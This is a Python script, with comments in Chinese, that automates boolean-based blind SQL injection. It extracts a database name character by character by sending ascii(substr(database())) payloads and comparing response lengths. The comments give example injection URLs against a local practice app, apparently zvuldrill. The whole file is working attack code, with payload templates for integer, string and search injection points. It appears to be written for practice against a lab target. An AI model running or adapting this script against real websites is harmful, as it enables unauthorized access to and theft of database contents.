# -*-coding:utf-8-*-

# 这两个注入语句都是正确的！不过最好还是把select带上
# SELECT * FROM test1 WHERE id=0 or if((ascii(substr((select database()),1,1))<120),1,0)
# SELECT * FROM test1 WHERE id=0 or if((select ascii(substr((select database()),1,1))<120),1,0)

# 查询数据库名字
# select * from movies where id='1' or if((select ascii(substr((select database()),1,1))=98),1,0);
# http://192.168.52.128/test2/zvuldrill-master/search.php?search=1%'or if((select ascii(substr((select database()),1,1))=122),1,0)%23
from global_data import glovar, glofun


def get_dbname(url=glovar.url3, cookie=False, type='search', dblength=9):
    dbname = ''

    response_length = 0

    if type == 'int':
        payload = '+or+if((select+ascii(substr((select+database()),{dbname_str_localtion},1))={ascii_number}),1,0)'
    elif type == 'string':
        payload = '\'+or+if((select+ascii(substr((select+database()),{dbname_str_localtion},1))={ascii_number}),1,0)%23'
    elif type == 'search':
        payload = '%\'+or+if((select+ascii(substr((select+database()),{dbname_str_localtion},1))={ascii_number}),1,0)%23'

    payloads = ["97", "98", "99", "100", "101", "102", "103", "104", "105", "106", "107", "108", "109", "110", "111",
                "112", "113", "114", "115", "116", "117", "118", "119", "120", "121", "122",
                "95",
                "48", "49", "50", "51", "52", "53", "54", "55", "56", "57"]

    for j in payloads:

        full_payload = url + payload.format(dbname_str_localtion=str(1), ascii_number=str(j))

        print(full_payload)
        url_read_length = len(glofun.url_request(full_payload, cookie))

        if (url_read_length-response_length) > 50:
            response_length = url_read_length

            dbname = chr(int(j))

    for i in range(2, dblength + 1):

        for j in payloads:

            full_payload = url + payload.format(dbname_str_localtion=str(i), ascii_number=str(j))

            url_read_length = len(glofun.url_request(full_payload, cookie))

            if (response_length - url_read_length) < 50:
                dbname += chr(int(j))

                print(dbname)

                break

    print(dbname)


def get_dbname2(url=glovar.url3, cookie=False, type='search', dblength=9):
    dbname = []

    response_length = 0

    payloads = ["97", "98", "99", "100", "101", "102", "103", "104", "105", "106", "107", "108", "109", "110", "111",
                "112", "113", "114", "115", "116", "117", "118", "119", "120", "121", "122",
                "95",
                "48", "49", "50", "51", "52", "53", "54", "55", "56", "57"]

    if type == 'int':
        payload = '+and+substr(database(),{dbname_str_localtion},1)={ascii_number}'
    elif type == 'string':
        payload = '\'+and+substr(database(),{dbname_str_localtion},1)={ascii_number}%23'
    elif type == 'search':
        payload = '%\'+and+substr(database(),{dbname_str_localtion},1)={ascii_number}%23'

    payloads = glofun.ascii_list_convert_to_hex_list(payloads)

    for j in payloads:

        full_payload = url + payload.format(dbname_str_localtion=str(1), ascii_number=str(j))

        url_read_length = len(glofun.url_request(full_payload, cookie))

        if (url_read_length-response_length) > 50:
            response_length = url_read_length

            dbname = []

            dbname.append(j)

    for i in range(2, dblength + 1):

        for j in payloads:

            full_payload = url + payload.format(dbname_str_localtion=str(i), ascii_number=str(j))

            url_read_length = len(glofun.url_request(full_payload, cookie))

            if (response_length - url_read_length) < 50:
                dbname.append(j)

                print(dbname)

                break

    print(dbname)

    print(glofun.ascii_list_convert_to_string(glofun.hex_list_convert_to_dec_list(dbname)))


if __name__ == "__main__":
    # get_dbname2()
    # get_dbname(glovar.url4, cookie=glovar.cookie, type='int', dblength=5)

    #get_dbname2()
    get_dbname2(glovar.url5, cookie=glovar.cookie, type='int', dblength=5)